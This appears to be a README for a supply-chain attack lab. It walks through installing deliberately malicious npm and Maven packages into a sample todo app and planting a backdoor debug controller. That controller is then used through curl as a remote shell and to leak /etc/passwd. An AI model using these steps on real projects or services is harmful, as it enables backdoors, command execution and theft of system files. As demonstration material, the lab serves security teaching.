# Supply Chain Attack Simulation

This directory contains intentionally malicious packages used to demonstrate how a
project could be infected with dependencies that appear legitimate.

## evil-package (Node.js)

1. Build the package:
   ```bash
   cd evil-package
   npm pack
   ```
   This produces a `.tgz` archive under `evil-package/`.

2. Infect the client application:
   ```bash
   cd ../../todo-client
   npm install ../malicious/evil-package/evil-package-1.0.0.tgz
   ```
   The `package.json` does not include this dependency by default; installing the
   archive adds it to `package-lock.json` for a more realistic compromise.

## evil-lib (Maven)

1. Build and install the library to the local Maven repository:
   ```bash
   cd evil-lib
   mvn install -DskipTests
   ```

2. Add the dependency to the backend:
   ```bash
   cd ../../todo-api
   mvn install:install-file \
       -DgroupId=com.malicious \
       -DartifactId=evil-lib \
       -Dversion=1.0.0 \
       -Dpackaging=jar \
       -Dfile=../malicious/evil-lib/target/evil-lib-1.0.0.jar
   # Then update pom.xml to reference com.malicious:evil-lib:1.0.0
   ```
  The manual step mimics an attacker injecting the dependency after the build
  has started.

## Malicious Debug Controller

1. Copy the malicious controller into the API:
   ```bash
   cd malicious
   cp debug-controller/src/main/java/com/example/demo/DebugController.java \
      ../todo-api/src/main/java/com/example/demo/DebugController.java
   cd ..
   ```

2. Rebuild the application so the new endpoints are active:
   ```bash
   cd ../todo-api
   ./mvnw package -DskipTests
   ```

3. Use the remote shell:
   ```bash
   curl "http://<todo-api-service>/debug-shell?cmd=whoami"
   ```

4. Leak `/etc/passwd` contents:
   ```bash
   curl "http://<todo-api-service>/leak"
   ```
